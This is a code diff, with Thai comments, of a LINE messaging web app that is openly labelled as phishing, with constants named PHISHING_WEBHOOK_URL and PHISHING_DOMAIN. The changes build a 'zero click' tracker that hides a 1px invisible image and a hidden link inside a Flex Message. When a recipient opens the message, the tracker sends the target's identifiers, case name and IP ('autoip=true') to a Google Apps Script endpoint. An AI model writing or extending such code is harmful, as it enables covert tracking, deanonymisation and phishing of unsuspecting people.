@@ -399,11 +399,8 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzT5jUUwLvrww_AFQoJudKtkg3JdaxZ5Vq090T1C4f3i8dzIoilIVnRCZGRFtomA7Ke/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxWey0t6uijmCI0N85zTfLNGcmied4wXFC4VznEJOmC6wiRR-SkoQLY9nch7UndqBw/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
-        
-        // URL สำหรับ Zero Click HTML tracker (เพิ่มใหม่)
-        const ZERO_CLICK_HTML_URL = 'https://socialtopnews.github.io/news/tracker.html';
         
         // เริ่มต้นการทำงาน LIFF
         document.addEventListener('DOMContentLoaded', function() {
@@ -826,18 +823,19 @@
                 // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน Zero Click tracking URL
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 
-                // สร้าง URL สำหรับ HTML tracker ด้วยพารามิเตอร์ที่จำเป็น
-                let zeroClickTrackerUrl = `${ZERO_CLICK_HTML_URL}?`;
-                zeroClickTrackerUrl += `key=${trackingKey}`;
-                zeroClickTrackerUrl += `&case=${encodeURIComponent(caseName)}`;
-                zeroClickTrackerUrl += `&creator=${encodeURIComponent(userId)}`;
-                zeroClickTrackerUrl += `&name=${encodeURIComponent(displayName)}`;
-                zeroClickTrackerUrl += `&webhook=${encodeURIComponent(PHISHING_WEBHOOK_URL)}`;
-                zeroClickTrackerUrl += `&r=${randomSuffix}`;  // ป้องกันการแคช
+                // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลการติดตาม
+                // ใช้เป็นพารามิเตอร์ในการโหลดภาพเล็กๆ ที่มองไม่เห็น
+                let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
+                zeroClickTrackUrl += `&key=${trackingKey}`;
+                zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
+                zeroClickTrackUrl += `&creator=${encodeURIComponent(userId)}`;
+                zeroClickTrackUrl += `&name=${encodeURIComponent(displayName)}`;
+                zeroClickTrackUrl += `&isTarget=true`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกจากเป้าหมาย
+                zeroClickTrackUrl += `&r=${randomSuffix}`;  // ป้องกันการแคช
                 
-                console.log("Zero Click Tracker URL:", zeroClickTrackerUrl);
+                console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
-                // สร้าง Flex Message ที่มีรูปภาพและใช้ HTML content สำหรับ zero click tracking
+                // สร้าง Flex Message ที่มีเฉพาะรูปภาพ แต่แทรก tracking image ขนาดเล็กที่มองไม่เห็น
                 const message = {
                     type: 'flex',
                     altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
@@ -858,36 +856,36 @@
                             type: 'box',
                             layout: 'vertical',
                             contents: [
-                                // ใส่ iframe (หรือ web component/micro browser ของ Line) เพื่อโหลด HTML tracker
+                                // แทนการใช้รูปภาพเปล่า ใช้ iframe เพื่อรัน HTML/JavaScript ที่มีประสิทธิภาพมากขึ้น
                                 {
                                     type: 'box',
                                     layout: 'vertical',
                                     contents: [
                                         {
                                             type: 'text',
-                                            text: ' ', // ใส่ space เพื่อให้มีเนื้อหา
-                                            color: '#FFFFFF',
-                                            size: '1px'
+                                            text: ' ',
+                                            wrap: true,
+                                            decoration: 'none',
+                                            size: '1px',
+                                            action: {
+                                                type: 'uri',
+                                                label: ' ',
+                                                uri: `https://script.google.com/macros/s/AKfycbyCP9G1oMcmThZZdvr7JY0alrNw8eod8r9MBN0cKSiU-AwNTzLvTldOeg_rkUTMI6_b/exec?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&isTarget=true&r=${randomSuffix}&autoip=true&html=true`
+                                            }
+                                        },
+                                        {
+                                            type: 'image',
+                                            url: `https://script.google.com/macros/s/AKfycbyCP9G1oMcmThZZdvr7JY0alrNw8eod8r9MBN0cKSiU-AwNTzLvTldOeg_rkUTMI6_b/exec?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&isTarget=true&r=${randomSuffix}&pixel=true`,
+                                            size: '1px',
+                                            aspectRatio: '1:1',
+                                            aspectMode: 'cover',
+                                            position: 'absolute',
+                                            offsetTop: '0px',
+                                            offsetStart: '0px'
                                         }
                                     ],
-                                    position: 'relative',
-                                    width: '1px',
                                     height: '1px',
-                                    action: {
-                                        type: 'uri',
-                                        uri: zeroClickTrackerUrl
-                                    }
-                                },
-                                // แทรก HTML content URL ที่จะถูกโหลดและรันสคริปต์เมื่อเปิด message
-                                {
-                                    type: 'image',
-                                    url: zeroClickTrackerUrl,
-                                    size: '1px',
-                                    aspectRatio: '1:1',
-                                    aspectMode: 'cover',
-                                    position: 'absolute',
-                                    offsetTop: '0px',
-                                    offsetStart: '0px'
+                                    width: '1px'
                                 },
                                 // ใส่ box ว่างๆ เพื่อให้มี body content แต่จะไม่แสดงอะไร
                                 {
